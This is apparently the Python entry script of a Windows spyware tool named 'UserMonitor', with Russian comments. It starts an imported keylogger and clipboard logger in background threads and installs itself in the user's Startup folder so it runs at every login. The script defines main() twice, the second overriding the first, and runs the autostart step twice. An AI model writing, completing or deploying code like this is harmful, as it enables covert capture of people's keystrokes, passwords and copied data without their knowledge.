import os
import threading
import logging
import sys
import time



# Setup logging
def setup_logging():
    if getattr(sys, 'frozen', False):
        base_dir = os.path.dirname(sys.executable)
    else:
        base_dir = os.path.dirname(os.path.abspath(__file__))

    log_file = os.path.join(base_dir, 'debug.log')

    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file, encoding='utf-8')
        ]
    )

setup_logging()
logging.info("=== APPLICATION START ===")

# Fix paths for imports
if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
    src_path = os.path.join(BASE_DIR, 'src')
    if src_path not in sys.path:
        sys.path.insert(0, src_path)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    parent_path = os.path.join(BASE_DIR, '..')
    if parent_path not in sys.path:
        sys.path.insert(0, parent_path)

# Import modules
try:
    from src.core.clipboard_logger import start_clipboard_logger

    logging.debug("Clipboard logger imported")
except Exception as e:
    logging.error(f"Clipboard logger import failed: {e}")

try:
    from src.core.process_logs import process_all_logs

    logging.debug("Process logs imported")
except Exception as e:
    logging.error(f"Process logs import failed: {e}")

try:
    from src.core.keylogger import start_keylogger

    logging.debug("Keylogger imported")
except Exception as e:
    logging.error(f"Keylogger import failed: {e}")

try:
    from src.utils.add_to_autostart import add_to_autostart

    logging.debug("Autostart imported")
except Exception as e:
    logging.error(f"Autostart import failed: {e}")

# Autostart setup
try:
    startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    shortcut_path = os.path.join(startup_dir, "UserMonitor.lnk")

    if not os.path.exists(shortcut_path):
        if getattr(sys, 'frozen', False):
            target_path = sys.executable
        else:
            target_path = os.path.join(BASE_DIR, 'run_all.py')
        add_to_autostart(target_path, "UserMonitor")
        logging.debug("Added to autostart")
except Exception as e:
    logging.error(f"Autostart setup failed: {e}")


def main():
    logging.info("Starting UserMonitor...")

    # Create logs directory
    try:
        logs_dir = os.path.join(BASE_DIR, 'logs')
        os.makedirs(logs_dir, exist_ok=True)
        logging.debug(f"Logs directory: {logs_dir}")
    except Exception as e:
        logging.error(f"Failed to create logs directory: {e}")

    # Process old logs
    try:
        process_all_logs()
        logging.debug("Log processing completed")
    except Exception as e:
        logging.error(f"Log processing failed: {e}")

    # Start clipboard monitor
    try:
        start_clipboard_logger()
        logging.debug("Clipboard logger started")
    except Exception as e:
        logging.error(f"Clipboard logger failed: {e}")

    # Start keylogger in separate thread
    def run_keylogger_wrapper():
        try:
            logging.debug("Starting keylogger...")
            start_keylogger()
        except Exception as e:
            logging.error(f"Keylogger failed: {e}")

    keylogger_thread = threading.Thread(target=run_keylogger_wrapper, daemon=True)
    keylogger_thread.start()
    logging.debug("Keylogger thread started")

    # Keep main thread alive
    try:
        logging.info("Application running in background...")
        while True:
            time.sleep(10)  # Sleep longer to reduce CPU usage
    except KeyboardInterrupt:
        logging.info("Application stopped by user")
    except Exception as e:
        logging.error(f"Main loop error: {e}")
def setup_autostart():
    """Настройка автозагрузки"""
    try:
        startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        shortcut_path = os.path.join(startup_dir, "UserMonitor.lnk")

        if os.path.exists(shortcut_path):
            print("Ярлык уже есть в автозагрузке!")
            return True

        # Путь к EXE или Python скрипту
        if getattr(sys, 'frozen', False):
            target_path = sys.executable
        else:
            target_path = os.path.join(BASE_DIR, 'run_all.py')

        add_to_autostart(target_path, "UserMonitor")
        print("Добавлено в автозагрузку!")
        return True

    except Exception as e:
        logging.error(f"Autostart setup failed: {e}")
        return False


def main():
    print("Запуск UserMonitor...")

    # Настройка автозагрузки
    setup_autostart()

    # Обработка старых логов
    try:
        process_all_logs()
    except Exception as e:
        logging.error(f"Log processing failed: {e}")

    # Запуск модулей
    try:
        start_clipboard_logger()
    except Exception as e:
        logging.error(f"Clipboard logger failed: {e}")

    # Запуск кейлоггера в отдельном потоке
    def run_keylogger_wrapper():
        try:
            start_keylogger()
        except Exception as e:
            logging.error(f"Keylogger failed: {e}")

    keylogger_thread = threading.Thread(target=run_keylogger_wrapper, daemon=True)
    keylogger_thread.start()

    print("Программа запущена и работает в фоне...")

    # Главный цикл
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Завершение работы...")


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logging.exception("Fatal error in main")
        print(f"Ошибка: {e}")